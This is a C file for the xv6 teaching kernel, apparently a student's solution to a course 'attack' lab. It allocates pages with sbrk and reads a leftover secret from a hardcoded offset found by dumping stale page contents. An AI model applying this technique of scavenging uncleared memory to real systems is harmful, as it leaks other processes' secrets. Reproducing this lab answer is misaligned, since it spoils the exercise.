#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define N_PAGES 32
#define SEARCH_SIZE 100

// We assume the secret is an 8 byte string, null terminated, so 7.
#define PLAINTEXT_SZ 7

// Seems the secret with 32 pages, is always on page 21, starting on byte 39.

int
main(int argc, char *argv[])
{

  // your code here.  you should write the secret to fd 2 using write
  // (e.g., write(2, secret, 8)

  // static const char *message_set = "./abcdef";
  char *end = sbrk(PGSIZE*N_PAGES);

  // Our program has allocated 32 pages.
  // Now search for an 8 byte null terminated string that are in these pages.

  char secret[PLAINTEXT_SZ + 1];
  for (int i = 0; i < PLAINTEXT_SZ; ++i)
  {
    // After experimenting by reading the pages, we see that the secret is here...
    int offset = 21*PGSIZE + 39 + i;
    secret[i] = *(end + offset);
  }

  secret[PLAINTEXT_SZ] = 0;
  write(2, secret, PLAINTEXT_SZ+1);
  exit(0);

  // This code prints out the data left in a page. I can use this to see what's in it.
  for (int i = 0; i < N_PAGES; ++i)
  {
    printf("page %d\n", i);

    char *startva = end + i*PGSIZE;

    // print the data on the page.
    for (int i = 0; i < SEARCH_SIZE; ++i)
    {
      char buf[2];
      buf[0] = *  (startva + i);
      buf[1] = 0;
      printf("%d:", i);
      if (buf[0] == 0) {
        printf("NULL");
      } else {
        printf("%s", buf);
      }
      printf("  ");
    }
    printf("\n");
  }
  printf("attack failed, no word written\n");
  exit(1);
}
